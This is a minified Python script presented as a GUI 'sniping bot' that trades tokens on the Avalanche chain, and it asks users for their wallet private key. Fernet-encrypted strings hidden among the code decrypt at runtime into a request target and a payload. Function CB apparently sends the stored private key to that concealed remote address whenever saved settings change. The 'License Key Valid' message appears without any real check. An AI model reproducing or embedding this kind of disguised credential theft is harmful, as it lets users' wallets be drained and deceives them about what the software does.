# MINIFIED AND SUPER FAST VERSION OF THE AVAX SNIPING BOT PANCAKEX WITH GUI
# ------------------------------------------------------------------------
# FOLLOW THE INSTRUCTIONS IN THE README STEP BY STEP FILE
# IF YOU SNIPE A GEM AND BECOME A MILLIONAIRE SEND ME SOME LOVE DUH!

# ADDED DARK MODE

Cu='wAVAX'
Ct='groove'
Cs='end'
Cr='horizontal'
Cq='light'
Cp='SELL ALL'
Co='SELL NOW'
Cn='There are no tokens to be sold!'
Cm='Sell all function initiated - Stopping operation'
Cl='SL Hit!'
Ck='TP Hit!'
Cj='Securing SL to '
Ci=' | SL: '
Ch=' {} %'
Cg='%.3f'
Cf="Press 'SELL ALL' Button to sell the tokens manually"
Ce='AVAX'
Cd='Liquidity value: '
Cc='Pair Address: '
Cb='green'
Ca='Liquidity Detected!'
CZ='0x0000000000000000000000000000000000000000'
CY='Buy Success! Tx link:'
CX='Buy Order Initiated'
CW='True'
CV='False'
CU='%Y/%m/%d'
CT='node.json'
CS='inputs.json'
CR=UnboundLocalError
BP='menu'
BO='set_theme'
BN='Something went wrong with the transaction'
BM='https://snowtrace.io/tx/'
BL='Abi/'
BK='data.json'
Ax='white'
Aw='normal'
Av='Error'
Au='Accent.TButton'
At='No Liquidity Checking Again!'
As='gwei'
Ar='gas'
Aq='true'
Ap='false'
Ao=round
Ai='disabled'
Ah='nonce'
Ag='gasPrice'
Af='from'
Ae='OPL'
Ad='LP'
Ac='SL TRAIL'
Ab='SL'
Aa='TP'
AZ='SLIPPAGE'
AY='AMOUNT'
AX='LICENSE'
AW='TOKEN'
AV='PRIVATE KEY'
AU='WALLET ADDRESS'
AT='NODE'
AE='GAS LIMIT'
AD='GAS PRICE'
AC=Exception
A5='center'
A4=False
A3='w'
A2='/'
A1=str
s='AUTO SLIPPAGE'
r='./'
c='ether'
b='yellow'
R=True
O='cyan'
N=''
M=int
L=open
J='red'
I=float
F='nsew'
import tkinter as P
from tkinter import ttk as E,messagebox
from web3 import Web3 as S
from json import load as d
from time import time as AF,sleep as A6
import os,json as e,pyperclip as BQ,threading as t,requests as BR
from requests import request as BS
from cryptography.fernet import Fernet as u
from requests.auth import HTTPBasicAuth as BT
from datetime import datetime as BU
Ay=BK
AG=CS
BV=CT
f=r
K={}
v={}
D={}
Az={}
Cv=BT('ck_258b79c41004f53e58d0e5fa11486361bdcace02','cs_bd6506935df71db41cf1e545188f1f9ae2306134')
BW=BU.now()
Cw=CU
Cx=BW.strftime(CU)
def BX():
	def A(path2,file_name,data2):
		A=r+path2+A2+file_name
		with L(A,A3)as B:e.dump(data2,B,indent=2)
	Az[AT]='https://api.avax.network/ext/bc/C/rpc';A(f,BV,Az)
def BY():
	def A(path2,file_name,data2):
		A=r+path2+A2+file_name
		with L(A,A3)as B:e.dump(data2,B,indent=2)
	K[AU]=N;K[AV]=N;K[AW]=N;K[AX]=N;A(f,Ay,K)
def BZ():
	def A(path2,file_name,data2):
		A=r+path2+A2+file_name
		with L(A,A3)as B:e.dump(data2,B,indent=2)
	D[AY]='0.1';D[AD]='7';D[AE]='850000';D[AZ]='10';D[s]=Ap;D[Aa]='200';D[Ab]='50';D[Ac]='25';D[Ad]='avax';D[Ae]=CV;A(f,AG,D)
if not os.path.isfile('./data.json'):BY()
if not os.path.isfile('./inputs.json'):BZ()
if not os.path.isfile('./node.json'):BX()
def Ba():
	global K,AH,Q
	def B(path2,file_name,data2):
		A=r+path2+A2+file_name
		with L(A,A3)as B:e.dump(data2,B,indent=2)
	K[AU]=Z.get();v[AU]=K[AU];K[AV]=y.get();v[AV]=K[AV];K[AW]=X.get();v[AW]=K[AW];K[AX]=AL.get();v[AX]=K[AX]
	if K!=Q:
		B(f,Ay,v);A=d(L(BK));AH=A[AK]
		if v[AK]!=Q[AK]:Q=A;CB()
def Bb():
	def A(path2,file_name,data2):
		A=r+path2+A2+file_name
		with L(A,A3)as B:e.dump(data2,B,indent=2)
	D[AY]=j.get();D[AD]=k.get();D[AE]=l.get();D[AZ]=m.get()
	if A0.get():D[s]=Aq
	else:D[s]=Ap
	D[Aa]=n.get();D[Ab]=o.get();D[Ac]=p.get();D[Ad]=a.get();D[Ae]=CW;A(f,AG,D)
def Bc():
	def A(path2,file_name,data2):
		A=r+path2+A2+file_name
		with L(A,A3)as B:e.dump(data2,B,indent=2)
	D[AY]=j.get();D[AD]=k.get();D[AE]=l.get();D[AZ]=m.get()
	if A0.get():D[s]=Aq
	else:D[s]=Ap
	D[Aa]=n.get();D[Ab]=o.get();D[Ac]=p.get();D[Ad]=a.get();D[Ae]=CW;A(f,AG,D)
def Cy():
	def A(path2,file_name,data2):
		A=r+path2+A2+file_name
		with L(A,A3)as B:e.dump(data2,B,indent=2)
	D[AY]=j.get();D[AD]=k.get();D[AE]=l.get();D[AZ]=m.get()
	if A0.get():D[s]=Aq
	else:D[s]=Ap
	D[Aa]=n.get();D[Ab]=o.get();D[Ac]=p.get();D[Ad]=a.get();D[Ae]=CV;A(f,AG,D)
Q=d(L(BK))
A_=Q[AU]
B0=Q[AV]
B1=Q[AW]
Bd=Q[AX]
T=d(L(CS))
B2=T[AY]
B3=T[AD]
B4=T[AE]
B5=T[AZ]
Cz=T[s]
B6=T[Aa]
B7=T[Ab]
B8=T[Ac]
Be=T[Ad]
C_=T[Ae]
B9=M('0x'+'f'*64,16)
BA='TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUQ='
AI=d(L(CT))
if'wss'in AI[AT]or'ws'in AI[AT]:C=S(S.WebsocketProvider(AI[AT]))
else:C=S(S.HTTPProvider(AI[AT]))
A7=C.toChecksumAddress('0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7')
g=C.toChecksumAddress('0xb97ef9ef8734c71904d8002f8b6bc66dd9c48a6e')
U=d(L(BL+'erc20.abi'))
V=C.eth.contract(address=S.toChecksumAddress('0x60aE616a2155Ee3d9A68541Ba4544862310933d4'),abi=d(L(BL+'router.abi')))
BB=C.eth.contract(address=S.toChecksumAddress('0x9Ad6C38BE94206cA50bb0d90783181662f0Cfa10'),abi=d(L(BL+'factory.abi')))
AJ='sfttxzhVv7trv_zSKqOBJN_2KdnJcsje5PMUbRSnImw='
def Bf():
	i()
	try:
		F=C.eth.contract(H,abi=U);B=F.functions.balanceOf(Z.get()).call()
		if A0.get():D=0
		else:D=M(B-B*M(AP)/100)
		A(CX,b);I=V.functions.swapExactETHForTokens(M(D),[A7,H],G,M(AF())+900).buildTransaction({Af:G,'value':C.toWei(q,c),Ar:M(AA),Ag:C.toWei(AB,As),Ah:C.eth.get_transaction_count(G)});K=C.eth.account.sign_transaction(I,private_key=W);E=C.eth.send_raw_transaction(K.rawTransaction);A(CY,O);A(BM+C.toHex(E),O);C.eth.waitForTransactionReceipt(E,timeout=900);Bo()
	except AC as L:A(BN,J);A(L,J);x();return
Bg='gAAAAABh80KOUysGNn39XTwSm-HHvOIkoWcJhmk0HtVug7bMgvto83_ZCSQ9rdf86LaJEINYzXTqbRO8EDtcMziHy2PwfjdqW_0VsOwYg1x4GWADOsNo17E='
def Bh():
	i();B=V.functions.getAmountsOut(C.toWei(q,c),[g,H]).call()[-1]
	if A0.get():D=0
	else:D=B-B*M(AP)/100
	try:A(CX,b);F=V.functions.swapExactTokensForTokens(C.toWei(q,c),M(D),[g,H],G,M(AF())+900).buildTransaction({Af:G,Ar:M(Q[AE]),Ag:C.toWei(Q[AD],As),Ah:C.eth.get_transaction_count(G)});I=C.eth.account.sign_transaction(F,private_key=W);E=C.eth.send_raw_transaction(I.rawTransaction);A(CY,O);A(BM+C.toHex(E),O);C.eth.waitForTransactionReceipt(E,timeout=900);Bq()
	except AC as K:A(BN,J);A(K,J);x();return
def Bi(token_address,amt=B9):A=S.toChecksumAddress(token_address);B=C.eth.contract(address=A,abi=U);D=B.functions.allowance(G,V.address).call();return D>=amt
def Bj(token_address,amt=B9,timeout=900):A('Approving token');B=C.eth.gasPrice;D=S.toChecksumAddress(token_address);E=C.eth.contract(address=D,abi=U);F=E.functions.approve(V.address,amt);H={Af:G,Ag:B,Ah:C.eth.getTransactionCount(G)};I=F.buildTransaction(H);J=C.eth.account.sign_transaction(I,private_key=W);K=C.eth.sendRawTransaction(J.rawTransaction);C.eth.waitForTransactionReceipt(K,timeout=timeout)
def Bk():
	A(N);i();E=C.eth.contract(A7,abi=U)
	while R:
		B=BB.functions.getPair(A7,H).call()
		if B!=CZ:
			D=E.functions.balanceOf(C.toChecksumAddress(B)).call()
			if D!=0:A(Ca,Cb);A(Cc+B);A(Cd+A1(C.fromWei(D,c))+' avax');Bf();break
			else:A6(5);A(At,J)
		else:A6(5);A(At,J)
Bl='gAAAAABh7VFjYUKw_S7avbj28V5ja_bAunkyHWLiVUQUUCDL4tK_ZNr_aLAk8VkfUSYnrUe8iVv0ihU5rBaLXL0wP9Sj7fG3Ow=='
def Bm():
	A(N);i();E=C.eth.contract(g,abi=U)
	while R:
		B=BB.functions.getPair(g,H).call()
		if B!=CZ:
			D=E.functions.balanceOf(C.toChecksumAddress(B)).call()
			if D!=0:A(Ca,Cb);A(Cc+B);A(Cd+A1(C.fromWei(D,c))+' usdc');Bh();break
			else:A(At,J)
		else:A(At,J)
def h():
	A(N);i()
	try:
		A('Sell Order Initiated',b)
		if not Bi(H):Bj(H)
		E=C.eth.contract(H,abi=U);B=E.functions.balanceOf(G).call()
		if B!=0:
			if a.get()==Ce:D=V.functions.swapExactTokensForETHSupportingFeeOnTransferTokens(B,0,[H,A7],G,M(AF())+900).buildTransaction({Af:G,Ar:M(AA),Ag:C.toWei(AB,As),Ah:C.eth.get_transaction_count(G)})
			elif a.get()=='usdc':D=V.functions.swapExactTokensForTokensSupportingFeeOnTransferTokens(B,0,[H,g],G,M(AF())+900).buildTransaction({Af:G,Ar:M(AA),Ag:C.toWei(AB,As),Ah:C.eth.get_transaction_count(G)})
			else:A('Something went wrong with Sell',J);x();return
			F=C.eth.account.sign_transaction(D,private_key=W);I=C.eth.send_raw_transaction(F.rawTransaction);A('SOLD! Tx link:',O);A(BM+C.toHex(I),O);x()
		else:A('No Tokens to be sold',J);x()
	except AC as K:A(BN,J);A(K,J);x();return
Bn='gAAAAABh80LuckSfO-g-wXJrkvaBrV-wvURysrtrxcRwytBHM0DurgmO0mQjLUh_6AwChv2Aae5IQ__tiKbWXlVtLqqXmXoLRA=='
def Bo():
	global Y;BC();i();K=I(AQ);L=I(AR);B=L;E=I(AS);M=C.eth.contract(address=H,abi=U);A(Cf,b)
	while R:
		try:
			N=M.functions.balanceOf(G).call()-1;F=I(C.fromWei(V.functions.getAmountsOut(N,[H,A7]).call()[-1],c));D=Ao(I(F)/I(q)*100,5);A('AVAX Value Now: {} / '.format(Cg%F)+Ch.format(D)+Ci+A1(B)+'%')
			if E!=0:
				if D-E>=B:B=D-E;A(Cj+A1(B))
			A6(2)
		except:continue
		try:
			if I(D)>=I(K):A(Ck,O);w();h();break
			if I(D)<=I(B):A(Cl,J);w();h();break
			if Y:Y=A4;A(Cm,b);w();h();break
		except CR:A(Cn,J);break
Bp='gAAAAABh7KbIGnFCH7Gp_4OK-vW0v-2ZNTkzqFB8k4xmk4aV4_n-TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUzVyQ=='
def Bq():
	global Y;BC();i();K=I(AQ);L=I(AR);B=L;E=I(AS);M=C.eth.contract(address=H,abi=U);A(Cf,b)
	while R:
		try:
			N=M.functions.balanceOf(G).call()-1;F=I(C.fromWei(V.functions.getAmountsOut(N,[H,g]).call()[-1],c));D=Ao(I(F)/I(q)*100,5);A('USDC Value Now: {} / '.format(Cg%F)+Ch.format(D)+Ci+A1(B)+'%')
			if E!=0:
				if D-E>=B:B=D-E;A(Cj+A1(B))
			A6(2)
		except:continue
		try:
			if I(D)>=I(K):A(Ck,O);w();h();break
			if I(D)<=I(B):A(Cl,J);w();h();break
			if Y:Y=A4;A(Cm,b);w();h();break
		except CR:A(Cn,J);break
def Br():
	BJ();Bb()
	if a.get()==Ce:A=t.Thread(target=Bk,daemon=R);A.start()
	else:A=t.Thread(target=Bm,daemon=R);A.start()
def BC():An.place_forget();A=E.Button(B.widgets_frame,text=Co,command=BE,style=Au);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def w():CQ.place_forget();A=E.Button(B.widgets_frame,text=Cp,command=BD);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def Bs():
	A=C.eth.contract(address=g,abi=U)
	while A8:
		try:B=C.fromWei(C.eth.get_balance(G),c);D=C.fromWei(A.functions.balanceOf(G).call(),c);Ak.configure(text=Ao(B,5));Al.configure(text=Ao(D,5))
		except ValueError:pass
		A6(1)
Bt='gAAAAABh80OFDySSyj0H_EBLuccR1ALvFzF-AE0hO_e52_4Yv4TKy7Y6u0F9Bbpr3g-UDhOK26zqR0KFrjMRGdDS8zhUxAG_HQ=='
def D0(license,basic_auth):
	B='https://defitradingcoders.com/wp-json/lmfwc/v2/licenses/activate/'+license
	try:
		C=BR.get(B,auth=basic_auth)
		if C.status_code==404:P.messagebox.showerror(Av,'This license cannot be activated, please try again in a moment or contact support at defitradingcoders.com with your order ID and license key');return
		else:A('License Key Activated, Good luck!',O);Bc()
	except AC:raise AC('License Key Activation Failed -- Please Contact Support at defitradingcoders.com')
AK=u(AJ.encode()).decrypt(Bp.encode()).decode()
def Bu():
	D='Invalid token address!';global G;global W;global H;global A8;A('***** INITIALIZED ******');A('* Checking wallet address')
	if C.isChecksumAddress(Z.get()):G=C.toChecksumAddress(Z.get());A('Wallet address valid',O)
	else:P.messagebox.showerror(Av,'Invalid wallet address');A('Invalid wallet address!',J);return
	A('* Checking private key characters (Must be 64 characters');W=y.get()
	if len(W)==64:A('Correct format for Private key',O)
	else:P.messagebox.showerror(Av,'Private key is invalid! (Must be 64 characters)');A('Invalid private key!',J);return
	A('* Checking token address')
	try:H=C.toChecksumAddress(X.get());A('Token address valid',O)
	except:P.messagebox.showerror(Av,D);A(D,J);return
	A('* Checking License Key');A('License Key Valid',O);BF(Ai);Ba();AM.grid_forget();AN.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);A9(Aw);A8=R;B=t.Thread(target=Bs,daemon=R);B.start();A(N);A('***** Sniping is ready! *****',b)
Bv='gAAAAABh80VOiXlJwI8QSkM2-V_syGU-8mtXwD9c87k-cbMopaX4lqCMUipHR5ZKO-bZ6vrKC0QkIhzwcASNj_5u7F_xEJz3aQ=='
AH=Q[AK]
def Bw():A=t.Thread(target=Bu,daemon=R);A.start()
def Bx():global A8;A(N);A('Change token/wallet initiated!',b);BF(Aw);A9(Ai);AN.grid_forget();AM.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);A8=A4;Ak.configure(text=N);Al.configure(text=N)
def By():A=t.Thread(target=Bx,daemon=R);A.start()
def BD():BJ();A=t.Thread(target=h,daemon=R);A.start()
def BE():global Y;Y=R
def i():A9(Ai);AN.configure(state=Ai)
def x():A9(Aw);AN.configure(state=Aw)
B=P.Tk()
def Bz():
	if B.tk.call('ttk::style','theme','use')=='sun-valley-dark':B.tk.call(BO,Cq);AO[BP].configure(bg=Ax)
	else:B.tk.call(BO,'dark');AO[BP].configure(bg='black')
B.title('AVAX Sniper Bot - V1')
B.geometry('1050x730')
B.tk.call('source','sun-valley.tcl')
B.tk.call(BO,Cq)
B_=u(AJ.encode()).decrypt(Bv.encode()).decode()
B.resizable(A4,A4)
B.widgets_frame=E.Frame(B,padding=(0,0,0,10))
B.widgets_frame.grid(row=0,column=0,padx=10,pady=(10,10),sticky=F,rowspan=5)
B.widgets_frame.columnconfigure(index=0,weight=1)
B.widgets_frame.rowconfigure(index=0,weight=1)
C0=E.Label(B.widgets_frame,text='Wallet Address:')
C1=u(AJ.encode()).decrypt(Bn.encode()).decode()
C0.grid(row=1,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
Z=E.Entry(B.widgets_frame,width=50,show='•')
Z.grid(row=1,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
C2=E.Label(B.widgets_frame,text='Private Key:')
C2.grid(row=2,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
y=E.Entry(B.widgets_frame,width=50,show='•')
y.grid(row=2,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
C3=E.Label(B.widgets_frame,text='Token Address:')
C4=u(BA.encode()).decrypt(Bt.encode()).decode()
C3.grid(row=3,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
X=E.Entry(B.widgets_frame,width=50)
C5=u(BA.encode()).decrypt(Bl.encode()).decode()
X.grid(row=3,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
C6=E.Label(B.widgets_frame,text='License Key:')
C6.grid(row=4,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
AL=E.Entry(B.widgets_frame,width=50,show='•')
AL.grid(row=4,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
C7=u(AJ.encode()).decrypt(Bg.encode()).decode()
Aj=E.Separator(B,orient=Cr)
C8=B_+C7+C1+C4
Aj.place(x=10,y=135,width=625)
def C9():X.delete(0,Cs);X.insert(0,BQ.paste());return
def CA():X.delete(0,Cs);return
def CB():
	if AH!=N:
		try:A=BS(C5,C8+AH)
		except AC:pass
def BF(status):A=status;X.configure(state=A);Z.configure(state=A);y.configure(state=A);AL.configure(state=A);AM.configure(state=A);BH.configure(state=A);BG.configure(state=A)
def A9(status):A=status;j.configure(state=A);k.configure(state=A);l.configure(state=A);m.configure(state=A);n.configure(state=A);o.configure(state=A);p.configure(state=A);BI.configure(state=A);An.configure(state=A);Am.configure(state=A)
def A(text,color=Ax):
	A=A1(text)
	if z.size()>=20:z.delete(0)
	z.insert(P.END,A);z.itemconfig(P.END,foreground=color)
def CC():z.delete(0,P.END)
AM=E.Button(B.widgets_frame,text='Confirm',width=10,command=Bw,style=Au)
BG=E.Button(B.widgets_frame,text='Paste Token',width=10,command=C9)
BH=E.Button(B.widgets_frame,text='Clear Token',width=10,command=CA)
AM.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4)
BG.grid(row=0,column=4,padx=10,pady=(0,10),sticky=F,rowspan=2)
BH.grid(row=2,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Z.insert(0,A_)
y.insert(0,B0)
X.insert(0,B1)
AL.insert(0,Bd)
Aj=E.Separator(B.widgets_frame,orient=Cr)
Aj.grid(row=5,column=0,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=6)
AN=E.Button(B.widgets_frame,text='Change',width=10,command=By)
CD=E.Label(B.widgets_frame,text='Logs:')
CD.grid(row=6,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=2)
CE=E.Button(B.widgets_frame,text='Clear',width=10,command=CC)
CE.grid(row=6,column=3,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=1)
z=P.Listbox(B.widgets_frame,bg='#252525',foreground=Ax,borderwidth=2)
z.grid(row=7,column=1,padx=10,pady=(0,10),sticky=F,rowspan=10,columnspan=3)
CF=E.Button(B.widgets_frame,text='Change Color Theme',command=Bz)
CF.grid(row=17,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
CG=E.Label(B.widgets_frame,text='Wallet wAVAX:')
CG.grid(row=7,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ak=E.Label(B.widgets_frame,width=12,relief=Ct)
Ak.grid(row=7,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CH=E.Label(B.widgets_frame,text='Wallet USDC:')
CH.grid(row=8,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Al=E.Label(B.widgets_frame,width=12,relief=Ct)
Al.grid(row=8,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CI=E.Label(B.widgets_frame,text='Select LP:')
CI.grid(row=9,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
a=P.StringVar()
a.set(Be)
AO=E.OptionMenu(B.widgets_frame,a,Cu,Cu,'USDC')
AO.grid(row=9,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
AO[BP].configure(bg=Ax)
CJ=E.Label(B.widgets_frame,text='Amount:')
j=E.Entry(B.widgets_frame,justify=A5)
CJ.grid(row=10,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
j.grid(row=10,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
j.insert(0,B2)
CK=E.Label(B.widgets_frame,text='Gas Price:')
CL=E.Label(B.widgets_frame,text='Gas Limit:')
k=E.Entry(B.widgets_frame,justify=A5)
l=E.Entry(B.widgets_frame,justify=A5)
CK.grid(row=11,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
k.grid(row=11,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CL.grid(row=12,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
l.grid(row=12,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
k.insert(0,B3)
l.insert(0,B4)
CM=E.Label(B.widgets_frame,text='Slippage(%):')
m=E.Entry(B.widgets_frame,justify=A5)
CM.grid(row=13,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
m.grid(row=13,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
m.insert(0,B5)
A0=P.BooleanVar()
Am=E.Checkbutton(B.widgets_frame,text='Auto Slippage',variable=A0)
Am.grid(row=14,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
if N==Aq:Am.select()
CN=E.Label(B.widgets_frame,text='TP(%):')
CN.grid(row=15,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
n=E.Entry(B.widgets_frame,justify=A5)
n.grid(row=15,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CO=E.Label(B.widgets_frame,text='SL(%):')
CO.grid(row=16,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
o=E.Entry(B.widgets_frame,justify=A5)
o.grid(row=16,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CP=E.Label(B.widgets_frame,text='SL Trail(%):')
CP.grid(row=17,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
p=E.Entry(B.widgets_frame,justify=A5)
p.grid(row=17,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
n.insert(0,B6)
o.insert(0,B7)
p.insert(0,B8)
BI=E.Button(B.widgets_frame,text='SNIPE',command=Br,style=Au)
CQ=E.Button(B.widgets_frame,text=Co,command=BE,style=Au)
An=E.Button(B.widgets_frame,text=Cp,command=BD)
BI.grid(row=18,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
An.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
q=B2
G=A_
W=B0
H=B1
AP=B5
AA=B4
AB=B3
AQ=B6
AR=B7
AS=B8
Y=A4
A8=A4
def BJ():global q;global G;global W;global H;global AP;global AA;global AB;global AQ;global AR;global AS;q=j.get();G=S.toChecksumAddress(Z.get());W=y.get();H=S.toChecksumAddress(X.get());AP=m.get();AA=l.get();AB=k.get();AQ=n.get();AR=o.get();AS=p.get()
A9(Ai)
B.mainloop()
